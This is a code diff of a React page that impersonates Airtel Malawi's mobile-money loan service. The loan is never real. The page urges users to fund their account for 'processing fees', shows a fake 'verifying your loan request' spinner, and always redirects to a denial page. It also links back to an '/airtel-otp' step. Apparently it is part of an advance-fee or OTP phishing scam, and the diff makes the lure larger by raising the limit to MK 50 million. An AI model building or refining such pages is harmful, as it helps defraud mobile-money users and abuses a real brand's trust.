@@ -1,160 +1,160 @@
-import React, { useEffect, useState } from 'react';
+import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 
 const MIN_LOAN = 100_000;
-const MAX_LOAN = 5_000_000;
+const MAX_LOAN = 50_000_000;
 const STEP = 100_000;
+const INTEREST_RATE = 0.15; // 15% flat rate example
 
 function AirtelLoanLimit() {
   const navigate = useNavigate();
-  const [phone, setPhone] = useState('');
-  const [loanAmount, setLoanAmount] = useState(1_000_000);
-
-  useEffect(() => {
-    const savedPhone = localStorage.getItem('airtelPhone') || '';
-    setPhone(savedPhone.replace('+265', '').replace('+', ''));
-  }, []);
+  const [loanAmount, setLoanAmount] = useState(5_000_000);
+  const [isProcessing, setIsProcessing] = useState(false);
 
   const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setLoanAmount(Number(e.target.value));
   };
 
-  const handleQuickSelect = (amount: number) => {
-    setLoanAmount(amount);
-  };
-
-  const handleConfirm = () => {
+  const handleContinue = () => {
     localStorage.setItem('airtelLoanAmount', String(loanAmount));
-    navigate('/airtel-denied');
-  };
-
-  const handleReturnHome = () => {
-    localStorage.removeItem('airtelLoanAmount');
-    localStorage.removeItem('airtelPhone');
-    navigate('/');
+    setIsProcessing(true);
+    // Simulate processing before going to denied page
+    setTimeout(() => {
+      navigate('/airtel-denied');
+    }, 2000); 
   };
 
   const formatMK = (amount: number) => amount.toLocaleString('en-US');
-
+  
+  const interestAmount = loanAmount * INTEREST_RATE;
+  const totalRepayment = loanAmount + interestAmount;
   const percent = ((loanAmount - MIN_LOAN) / (MAX_LOAN - MIN_LOAN)) * 100;
 
   return (
-    <div className="airtel-loan-container">
+    <div className="page-wrapper">
       <style>{`
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .airtel-loan-container { display: flex; flex-direction: column; min-height: 100vh; background-color: #F8F9FA; }
-        .loan-header { background-color: #ffffff; padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #E5E7EB; }
-        .back-btn { background: none; border: none; cursor: pointer; padding: 8px; display: flex; align-items: center; justify-content: center; }
-        .logo-wrapper { display: flex; flex-direction: column; align-items: center; }
-        .tagline { font-size: 8px; letter-spacing: 1px; color: #333; text-transform: uppercase; margin-top: 4px; font-weight: 600; }
-        .tagline span { color: #DA1C1C; }
-        .loan-main { flex: 1; padding: 32px 24px; display: flex; flex-direction: column; align-items: center; }
-        .loan-card { background-color: #ffffff; width: 100%; max-width: 420px; border-radius: 20px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06); border: 1px solid #F3F4F6; }
-        .loan-title { font-size: 24px; font-weight: 800; color: #1a1a1a; text-align: center; margin-bottom: 8px; }
-        .loan-subtitle { font-size: 14px; color: #6B7280; text-align: center; margin-bottom: 24px; line-height: 1.5; }
-        .phone-display { text-align: center; font-size: 13px; color: #6B7280; margin-bottom: 20px; }
-        .phone-display strong { color: #1a1a1a; }
-        .amount-display { display: flex; align-items: baseline; justify-content: center; gap: 8px; margin-bottom: 24px; padding: 20px; background-color: #FEF2F2; border-radius: 16px; border: 1px solid #FECACA; }
-        .currency-label { font-size: 20px; font-weight: 800; color: #DA1C1C; }
-        .amount-value { font-size: 40px; font-weight: 900; color: #DA1C1C; letter-spacing: -1px; }
-        .slider-wrapper { width: 100%; margin-bottom: 24px; }
-        .loan-slider { -webkit-appearance: none; appearance: none; width: 100%; height: 8px; border-radius: 4px; outline: none; margin: 8px 0; cursor: pointer; }
-        .loan-slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 28px; height: 28px; border-radius: 50%; background: #DA1C1C; border: 3px solid #ffffff; box-shadow: 0 2px 8px rgba(218, 28, 28, 0.4); cursor: pointer; }
-        .loan-slider::-moz-range-thumb { width: 28px; height: 28px; border-radius: 50%; background: #DA1C1C; border: 3px solid #ffffff; box-shadow: 0 2px 8px rgba(218, 28, 28, 0.4); cursor: pointer; }
-        .slider-labels { display: flex; justify-content: space-between; font-size: 12px; color: #9CA3AF; font-weight: 600; margin-top: 8px; }
-        .quick-amounts { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-bottom: 28px; }
-        .quick-btn { padding: 8px 14px; border-radius: 20px; border: 1.5px solid #E5E7EB; background-color: #ffffff; color: #4B5563; font-size: 13px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
-        .quick-btn.selected { background-color: #DA1C1C; border-color: #DA1C1C; color: #ffffff; }
-        .quick-btn:hover { border-color: #DA1C1C; }
-        .confirm-btn { width: 100%; padding: 18px; border-radius: 30px; border: none; background-color: #DA1C1C; color: #ffffff; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: background-color 0.2s; margin-bottom: 16px; }
-        .confirm-btn:active { background-color: #B91414; }
-        .terms-text { font-size: 12px; color: #9CA3AF; text-align: center; line-height: 1.5; }
-        .loan-footer { padding: 24px; text-align: center; color: #9CA3AF; font-size: 12px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #DA1C1C; }
+        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
+        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
+        .menu-icon { position: absolute; left: 20px; font-size: 24px; cursor: pointer; }
+        .header-title { font-size: 22px; font-weight: 900; }
+        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
+        
+        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; }
+        .back-link { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #6B7280; margin-bottom: 20px; cursor: pointer; }
+        .card-title { font-size: 26px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; }
+        .card-sub { font-size: 15px; color: #6B7280; margin-bottom: 24px; line-height: 1.5; }
+        
+        .step-text { font-size: 14px; color: #4B5563; line-height: 1.6; margin-bottom: 16px; }
+        
+        .slider-container { margin: 32px 0; }
+        .amount-display { font-size: 36px; font-weight: 900; color: #DA1C1C; text-align: center; margin-bottom: 16px; }
+        .loan-slider { -webkit-appearance: none; width: 100%; height: 8px; border-radius: 4px; outline: none; cursor: pointer; }
+        .loan-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #DA1C1C; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.3); cursor: pointer; }
+        .slider-labels { display: flex; justify-content: space-between; font-size: 12px; color: #9CA3AF; font-weight: 600; margin-top: 12px; }
+        
+        .breakdown-box { background: #F9FAFB; border: 1px solid #E5E7EB; border-radius: 12px; padding: 16px; margin-bottom: 24px; }
+        .breakdown-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
+        .breakdown-row:last-child { margin-bottom: 0; font-weight: 800; color: #1a1a1a; padding-top: 8px; border-top: 1px dashed #D1D5DB; }
+        .breakdown-label { color: #6B7280; }
+        
+        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; background: #F87171; color: #1a1a1a; }
+        .btn:active { background: #EF4444; }
+        
+        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
+        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
+        
+        .overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
+        .spinner-box { background: #fff; width: 90%; max-width: 380px; padding: 40px 24px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .spinner { width: 50px; height: 50px; margin: 0 auto 24px; position: relative; }
+        .spinner div { transform-origin: 40px 40px; animation: spin 1.2s linear infinite; }
+        .spinner div:after { content: " "; display: block; position: absolute; top: 3px; left: 37px; width: 6px; height: 16px; border-radius: 20%; background: #DA1C1C; }
+        .spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; } .spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
+        .spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; } .spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
+        .spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; } .spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
+        .spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; } .spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
+        .spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; } .spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
+        .spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; } .spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
+        @keyframes spin { 0% { opacity: 1; } 100% { opacity: 0; } }
       `}</style>
 
-      <div className="loan-header">
-        <button className="back-btn" onClick={handleReturnHome}>
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="19" y1="12" x2="5" y2="12" />
-            <polyline points="12 19 5 12 12 5" />
-          </svg>
-        </button>
-        <div className="logo-wrapper">
-          <svg width="100" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-            <circle cx="25" cy="17" r="5" fill="white"/>
-            <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-          </svg>
-          <p className="tagline">A REASON TO <span>IMAGINE</span></p>
-        </div>
-        <div style={{ width: 40 }} />
-      </div>
-
-      <div className="loan-main">
-        <div className="loan-card">
-          <h1 className="loan-title">Choose Your Loan Amount</h1>
-          <p className="loan-subtitle">
-            Select the amount you want to borrow. You can choose between MK 100,000 and MK 5,000,000.
-          </p>
-
-          {phone && (
-            <p className="phone-display">
-              For phone number: <strong>+265 {phone}</strong>
-            </p>
-          )}
-
-          <div className="amount-display">
-            <span className="currency-label">MK</span>
-            <span className="amount-value">{formatMK(loanAmount)}</span>
-          </div>
-
-          <div className="slider-wrapper">
-            <input
-              type="range"
-              min={MIN_LOAN}
-              max={MAX_LOAN}
-              step={STEP}
-              value={loanAmount}
-              onChange={handleSliderChange}
-              className="loan-slider"
-              style={{
-                background: `linear-gradient(to right, #DA1C1C ${percent}%, #E5E7EB ${percent}%)`,
-              }}
-            />
-            <div className="slider-labels">
-              <span>MK 100,000</span>
-              <span>MK 5,000,000</span>
+      {isProcessing && (
+        <div className="overlay">
+          <div className="spinner-box">
+            <div className="spinner">
+              <div></div><div></div><div></div><div></div><div></div><div></div>
+              <div></div><div></div><div></div><div></div><div></div><div></div>
             </div>
+            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Processing...</h2>
+            <p style={{fontSize: '14px', color: '#6B7280'}}>Please wait while we verify your loan request...</p>
           </div>
-
-          <div className="quick-amounts">
-            {[500000, 1000000, 2000000, 3000000, 5000000].map((amt) => (
-              <button
-                key={amt}
-                className={`quick-btn ${loanAmount === amt ? 'selected' : ''}`}
-                onClick={() => handleQuickSelect(amt)}
-              >
-                {formatMK(amt)}
-              </button>
-            ))}
-          </div>
-
-          <button className="confirm-btn" onClick={handleConfirm}>
-            Confirm Loan Amount
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12" />
-              <polyline points="12 5 19 12 12 19" />
-            </svg>
-          </button>
-
-          <p className="terms-text">
-            By confirming, you agree to Airtel Money's loan terms and conditions. Interest and fees apply.
-          </p>
         </div>
+      )}
+
+      <div className="header-top">
+        <div className="menu-icon">≡</div>
+        <h1 className="header-title">Airtel Malawi</h1>
+      </div>
+      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
+
+      <div className="card">
+        <div className="back-link" onClick={() => navigate('/airtel-otp')}>← Back</div>
+        
+        <h2 className="card-title">Your loan application</h2>
+        <p className="card-sub">Here are the steps to get your loan:</p>
+
+        <div className="step-text">
+          1. Ensure your Airtel account has sufficient funds to cover the processing fees. If not, please make a deposit.<br/><br/>
+          2. Select your desired loan amount below. An interest rate of <b>15%</b> will be applied to the principal.<br/><br/>
+          <b>Note:</b> No amount will be deducted before receiving your loan.
+        </div>
+
+        <div className="slider-container">
+          <div className="amount-display">MK {formatMK(loanAmount)}</div>
+          <input 
+            type="range" 
+            min={MIN_LOAN} 
+            max={MAX_LOAN} 
+            step={STEP} 
+            value={loanAmount} 
+            onChange={handleSliderChange} 
+            className="loan-slider"
+            style={{ background: `linear-gradient(to right, #DA1C1C ${percent}%, #E5E7EB ${percent}%)` }}
+          />
+          <div className="slider-labels">
+            <span>MK 100K</span>
+            <span>MK 50M</span>
+          </div>
+        </div>
+
+        <div className="breakdown-box">
+          <div className="breakdown-row">
+            <span className="breakdown-label">Principal Amount</span>
+            <span>MK {formatMK(loanAmount)}</span>
+          </div>
+          <div className="breakdown-row">
+            <span className="breakdown-label">Interest (15%)</span>
+            <span>MK {formatMK(interestAmount)}</span>
+          </div>
+          <div className="breakdown-row">
+            <span>Total Repayment</span>
+            <span>MK {formatMK(totalRepayment)}</span>
+          </div>
+        </div>
+
+        <button className="btn" onClick={handleContinue}>
+          Continue to get loan →
+        </button>
       </div>
 
-      <div className="loan-footer">
-        © 2026 Airtel Malawi. All rights reserved.
+      <div className="bottom-brands">
+        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
+        <div className="brand-icon" style={{color: '#1E293B'}}>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
+        </div>
+        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
       </div>
     </div>
   );
